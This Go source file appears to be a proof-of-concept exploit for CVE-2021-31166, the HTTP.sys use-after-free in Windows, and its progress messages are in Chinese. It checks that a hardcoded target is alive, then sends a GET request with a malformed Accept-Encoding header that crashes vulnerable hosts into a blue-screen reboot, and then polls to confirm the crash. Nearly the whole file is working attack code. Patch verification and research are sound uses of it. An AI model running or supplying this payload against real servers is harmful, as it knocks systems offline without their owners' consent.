package main

import (
	"fmt"
	"log"
	"net/http"
	"time"
)

func firstHandshake(target string) (bool) {
	resp, err := http.Get(target)
	if err != nil {
		fmt.Printf("首次握手错误: 目标主机异常, 请检查目标主机是否存活, error resp: %s\n", err)
		return false
	}
	defer resp.Body.Close()
	statusCode := resp.StatusCode
	log.Println(statusCode)
	if statusCode == 200 {
		fmt.Printf("首次握手: 目标主机正常, 可进行POC验证\n")
		return true
	}
	fmt.Printf("首次握手: 目标主机正常, 但返回异常, 状态码: %d\n", statusCode)
	return false
}

func verifyHandshake(target string) (bool) {
	resp, err := http.Get(target)
	if err != nil {
		fmt.Printf("验证结果: 验证成功, 目标主机异常, 已被利用并进入蓝屏重启\n")
		return true
	}
	defer resp.Body.Close()
	statusCode := resp.StatusCode
	log.Println(statusCode)
	if statusCode == 200 {
		fmt.Printf("验证结果: 目标主机已重启恢复正常\n")
		return false
	}
	fmt.Printf("验证结果: 目标主机已重启恢复正常, 但返回异常, 状态码: %d\n", statusCode)
	return false
}

//Poc for CVE-2021-31166: remote UAF in HTTP.sys
func poc(target string) (bool, error) {
	client := &http.Client{
		Timeout: time.Second * 5,
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false, err
	}

	req.Header.Set("Accept-Encoding", "doar-e, ftw, imo, ,")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("POC握手成功: %s maybe can Exploit!\n", target)
		return true, nil
	}
	statusCode := resp.StatusCode
	fmt.Printf("POC握手失败: %s 不存在 CVE-2021-31166 漏洞, 可能已经打过补丁, 状态码: %d\n", target, statusCode)

	return false, nil
}

func main() {
	url := "http://192.168.199.61"
	fmt.Printf("开始验证: %s\n", url)
	resp := firstHandshake(url)
	if resp != true {
		fmt.Printf("%s 不存在 CVE-2021-31166 漏洞\n", url)
	}
	_, err := poc(url)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("再次进行确定性验证\n")
	for {
		time.Sleep(time.Second * 10)
		resp := verifyHandshake(url)
		if resp != true {
			break
		}
		fmt.Printf("%s have CVE-2021-31166 vulnerability, can be exploited!\n", url)
	}

}
